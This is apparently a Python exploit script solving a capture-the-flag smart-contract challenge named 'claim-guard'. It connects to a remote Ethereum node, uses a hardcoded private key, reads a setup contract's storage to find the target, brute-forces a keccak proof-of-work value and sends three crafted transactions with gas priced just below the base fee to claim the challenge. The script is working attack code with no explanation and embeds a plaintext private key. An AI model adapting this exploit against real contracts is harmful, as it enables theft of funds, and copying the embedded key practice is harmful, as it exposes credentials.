from web3 import Web3
from web3.auto import w3 as lw3

rw3 = Web3(Web3.HTTPProvider("http://claim-guard.wm-team.cn:8545/RcDXgGKTmqZntGMLsMsWHcBt/main"))

tta=lw3.eth.account.from_key("0x67adf1c3c1b8e8c84c84c4558ab4d83b572e625cc3d074aa2eb15a1a739be3da")
print(tta.address)

print(rw3.eth.get_balance(tta.address)/1e18)

setupaddr="0xc100F78da7E53a09b79C263c5c1D11542CB00704"

challaddr=rw3.eth.get_storage_at(setupaddr, 0x0).hex()
challaddr="0x" + challaddr[-40:]
challaddr = Web3.to_checksum_address(challaddr)
print(challaddr)

nonc = rw3.eth.get_transaction_count(tta.address)
gasp = rw3.eth.gas_price
print(gasp)

bln = rw3.eth.block_number + 1

basegas = rw3.eth.get_block(bln-1).baseFeePerGas
print(basegas)

gasp = basegas-1
# exit(0)

data="0xccac0007"
tx = {
    'to': challaddr,
    'value': 0,
    'gas': 500000,
    'gasPrice': gasp,
    'nonce': nonc,
    'data': data
}
signed = lw3.eth.account.sign_transaction(tx, private_key=tta.key)
txhash1 = rw3.eth.send_raw_transaction(signed.rawTransaction)

print(txhash1.hex())

for t in range(100000):
    #proveWork
    inn = bytes.fromhex("%064x%064x" % (t, bln))
    hash = Web3.keccak(inn).hex()
    bhash = hash[2:]
    assert len(bhash) == 64
    v = int(bhash, 16)
    if (v>>0xf0) == 0:
        print("found")
        print(t, bhash)
        break

data = "0x27d4563e" + "%064x" % t
tx = {
    'to': challaddr,
    'value': 0,
    'gas': 500000,
    'gasPrice': gasp,
    'nonce': nonc+1,
    'data': data
}

signed = lw3.eth.account.sign_transaction(tx, private_key=tta.key)
txhash2 = rw3.eth.send_raw_transaction(signed.rawTransaction)
print(txhash2.hex())

data = "0xe5be4428" + tta.address[2:].zfill(64)
tx = {
    'to': challaddr,
    'value': 0,
    'gas': 500000,
    'gasPrice': gasp,
    'nonce': nonc+2,
    'data': data
}

signed = lw3.eth.account.sign_transaction(tx, private_key=tta.key)
txhash3 = rw3.eth.send_raw_transaction(signed.rawTransaction)
print(txhash3.hex())

print(rw3.eth.wait_for_transaction_receipt(txhash1.hex()))
print(rw3.eth.wait_for_transaction_receipt(txhash2.hex()))
print(rw3.eth.wait_for_transaction_receipt(txhash3.hex()))
